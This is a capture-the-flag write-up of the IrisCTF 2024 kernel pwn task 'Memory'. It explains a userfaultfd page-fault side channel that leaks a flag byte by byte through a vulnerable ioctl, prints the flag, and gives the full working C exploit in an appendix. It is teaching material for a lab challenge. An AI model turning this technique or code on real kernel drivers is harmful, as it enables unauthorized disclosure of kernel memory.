# Memory - IrisCTF 2024 (pwn, 42 solved, 421p)

## Introduction
Memory is a pwn task.

An archive containing the source code of a kernel module, a Makefile and a
Dockerfile is given.

## Reverse engineering
The kernel module creates a new device called `primer` with an ioctl handler.

The ioctl handler only handles a single ioctl defined as `IOCTL_QUERY`.

This ioctl takes a 64-bit argument that contains two values: an address encoded
in the least 56 bits and an index encoded in the 8 most significant bits.

```
................................................................
iiiiiiii
        aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The module will then fetch a byte at address `addr + flag[index]`.

## Vulnerabilities
The virtual machine used on the remote server allows an unprivileged user to use
the `userfaultfd` syscall.

```
$ cat /proc/sys/vm/unprivileged_userfaultfd
1
```

It is possible to use `userfaultfd` to intercept a page fault when the kernel
module fetches an unmapped page.

## Exploitation
It is possible to use `userfaultfd` to know what *page* has been fetched by the
kernel module, but not the exact address.

By allocating two pages and registering those pages with `userfaultfd`, it
becomes possible to know check if `flag[i] >= k`.

When sending a pointer of `map + 0x1000 - k`, if the previous assertion is true,
then the kernel module will fetch from the second page, otherwise it will fetch
from the first page.

With this primitive in hand, the exploitation becomes straightforward: try every
bytes in the range `0x20..0x80` until the assertion becomes false to find a
single character of the flag. Repeat the operation until the final `}`.

**Flag**: `irisctf{the_cache_always_remembers}`

## Appendices
### pwn.c
```c
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <sys/mman.h>
#include <pthread.h>

#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>

#include <sys/syscall.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>

#include <linux/ioctl.h>

#define MAJOR_NUM 100

#define IOCTL_QUERY _IOR(MAJOR_NUM, 0, unsigned long)
#define DEVICE_FILE_NAME "primer"


int userfaultfd(int flags)
{
	return syscall(SYS_userfaultfd, flags);
}

static long query(int fd, void *addr, unsigned char c)
{
	uint64_t x = (uint64_t)addr;
	x &= 0x00FFFFFFFFFFFFFFl;
	x |= (uint64_t)c << 56;

	return ioctl(fd, IOCTL_QUERY, x);
}

static void* handler(void *arg)
{
	int uffd = *(int*)arg;

	struct uffd_msg msg;
	ssize_t n = read(uffd, &msg, sizeof(msg));

	if(n <= 0) {
		printf("oops\n");
		return NULL;
	}

	if(UFFD_EVENT_PAGEFAULT != msg.event)
		printf("event = %X\n", msg.event);

	struct uffdio_zeropage zero = {
		.range    = {msg.arg.pagefault.address, 0x1000},
		.mode     = 0,
		.zeropage = 0,
	};

	if(0 != ioctl(uffd, UFFDIO_ZEROPAGE, &zero))
		perror("UFFDIO_ZEROPAGE");

	return msg.arg.pagefault.address;
}

static int uffd_prepare(void)
{
	int uffd = userfaultfd(O_CLOEXEC);
	if(uffd < 0) {
		perror("userfaultfd");
		return -1;
	}

	// UFFDIO_API
	struct uffdio_api api = {
		.api      = UFFD_API,
		.features = 0,
		.ioctls   = 0,
	};

	if(0 != ioctl(uffd, UFFDIO_API, &api)) {
		perror("ioctl(UFFDIO_API)");
		close(uffd);
		return -1;
	}

	return uffd;
}

int main(void)
{
	// Open uffd
	int uffd = uffd_prepare();
	if(uffd < 0)
		return EXIT_FAILURE;

	// Open device
	int fd = open("/dev/primer", O_RDONLY);
	if(fd < 0) {
		perror("open");
		goto err1;
	}

	void *map = NULL;
	char flag[0x80] = {};

	for(size_t i = 0; i < sizeof(flag); i++) {
		for(size_t j = 0x20; j < 0x80; j++) {
			map = mmap((void*)0xCAFE0000, 0x2000, PROT_READ,
				MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);

			if(MAP_FAILED == map) {
				perror("mmap");
				goto err2;
			}

			// UFFDIO_REGISTER
			struct uffdio_register reg = {
				.mode   = UFFDIO_REGISTER_MODE_MISSING,
				.ioctls = 0,
				.range  = {
					.start = (unsigned long long)map,
					.len = 0x2000
				},
			};

			// Create thread
			pthread_t thread;
			if(0 != pthread_create(&thread, NULL, handler, &uffd)) {
				perror("pthread_create");
				goto err3;
			}

			if(0 != ioctl(uffd, UFFDIO_REGISTER, &reg)) {
				perror("ioctl(UFFDIO_REGISTER");
				goto err3;
			}

			// Trigger fault
			query(fd, map + 0x1000 - j - 1, i);

			// Get rid of the thread
			void *ret = NULL;
			if(0 != pthread_join(thread, &ret)) {
				perror("pthread_detach");
				goto err3;
			}


			// Unmap pages
			munmap(map, 0x2000);

			if(map == ret) {
				flag[i] = j;
				break;
			}
		}

		if(flag[i] == 0 || flag[i] == '}')
			break;
	}

	puts(flag);

	close(fd);
	close(uffd);
	return EXIT_SUCCESS;

err3:
	munmap(map, 0x2000);

err2:
	close(fd);
err1:
	close(uffd);
	return EXIT_FAILURE;
}
```
